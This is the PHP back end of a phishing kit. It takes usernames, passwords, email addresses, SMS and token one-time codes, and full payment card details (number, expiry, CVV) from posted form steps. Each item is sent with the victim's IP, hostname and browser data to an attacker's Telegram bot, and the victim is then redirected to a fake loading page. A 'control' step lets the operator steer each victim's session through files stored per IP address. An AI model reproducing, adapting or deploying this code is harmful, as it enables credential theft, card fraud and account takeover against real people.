<?php

   require_once "../includes/main.php";
   //require_once "../app.php";
   
    function victim_infos() {
        $detect         = new BrowserDetection();
        $ip             = get_client_ip();
        $browserName    = $detect->getName();
        $browserVer     = $detect->getVersion();
        $isMobile       = ($detect->isMobile()) ? 'true' : 'false';
        $platformName   = $detect->getPlatformVersion();
        $hostname       = gethostbyaddr(get_client_ip());
        $message        = "IPA    : $ip | $hostname" . "\r\n";
        $message        .= "Agent : $browserName | $browserVer | Mobile : $isMobile  |  $platformName"  . "\r\n\r\n";
        return $message;
    }
	
    function get_steps_link() {
        $url = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        $x = pathinfo($url);
        return $ee = $x['dirname'] . '/bontrol.php?ip=' . get_client_ip();
    }
    function reset_data() {
        $fp = fopen('vics/'. get_client_ip() .'.txt', 'wb');
        fwrite($fp, '');
        fclose($fp);
    }  
	
	
	function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
	
	
   function telegram_send($message) {
    $curl = curl_init();
    $api_key  = TELEGRAM_TOKEN;
    $chat_id  = TELEGRAM_CHAT_ID;
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}
   
  
		
      
		

			
        if ($_POST['step'] == "login") {
          
                $message = "/-- LOGIN  ing --/" . get_client_ip() . "\r\n";
                $message .= 'user  : ' . $_POST['user'] . "\r\n";
				$message .= 'user : ' . $_POST['user2'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
              
               
                header("Location: loading.php?verification#_");
                exit();
			
			
            }
		

		    if ($_POST['step'] == "code") {
            $_SESSION['errors']     = [];	
                
				$message  = '/ing | token1/' . get_client_ip() . "\r\n";
                $message .= 'token1 : ' . $_POST['token'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
              
               
                header("Location: loading.php?verification#_");
                exit();
                  
            }
			
			
			
			
			
			
			if ($_POST['step'] == "code2") {
                
				$message = '/ing | token2/' . get_client_ip() . "\r\n";
                $message .= 'code2 : ' . $_POST['token2'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
              
               
                header("Location: loading.php?verification#_");
                exit();
                  
            }

				
		    if ($_POST['step'] == "code3") {
                
				$message = '/ing | token3/' . get_client_ip() . "\r\n";
                $message .= 'code3 : ' . $_POST['token3'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
              
               
                header("Location: loading.php?verification#_");
                exit();
                  
            }
		

		

			

        if ($_POST['step'] == "sms") {
           
            
				$message = "/-- SMS  ing --/" . get_client_ip() . "\r\n";
                $message .= 'SMS : ' . $_POST['otp'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: loading.php?verification#_");
                exit();
            
        }
		
		        if ($_POST['step'] == "extra") {
           
            
				$message = "/-- extra FORTI --/" . get_client_ip() . "\r\n";
                $message .= 'extra : ' . $_POST['otp'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: loading.php?verification#_");
                exit();
            
        }
		
		if ($_POST['step'] == "emlll") {
           
            
				$message = "/-- email  ing --/" . get_client_ip() . "\r\n";
                $message .= 'email : ' . $_POST['eml'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END email INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: loading.php?verification#_");
                exit();
            
        }
		
		
				if ($_POST['step'] == "passw") {
           
            
				$message = "/-- PASS  ing --/" . get_client_ip() . "\r\n";
                $message .= 'PASS : ' . $_POST['pass'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END PASS INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: loading.php?verification#_");
                exit();
            
        }
		
		
		        if ($_POST['step'] == "exp") {
			
					
                $message = "/-- exp/num INFOS ing --/" . get_client_ip() . "\r\n";
                $message .= "exp : " . $_POST['exp'] . "\r\n";
                $message .= "num : " . $_POST['num'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: loading.php?verification#_");
                exit();
            
                
            
        }
		
        if ($_POST['step'] == "cc") {
			
					
                $message = "/-- CARD INFOS ing --/" . get_client_ip() . "\r\n";
                $message .= "Card num : " . $_POST['c'] . "\r\n";
                $message .= "Card exp : " . $_POST['ex'] . "\r\n";
                $message .= "cvv : " . $_POST['cv'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
                header("Location: loading.php?verification#_");
                exit();
            
                
            
        }
     
	
	
	
	
	
	   if ($_POST['step'] == "control") {
            $fp = fopen('vics/'. $_POST['ip'] .'.txt', 'wb');
           
        $to = $_POST['to'];
        $signaturcode = $_POST['signaturcode'];
		$signaturcode2 = $_POST['signaturcode2'];
 
           
               fwrite($fp, "$to|$signaturcode$signaturcode2");
            fclose($fp);
            header("location: bontrol.php?ip=" . $_POST['ip']);
        }
?>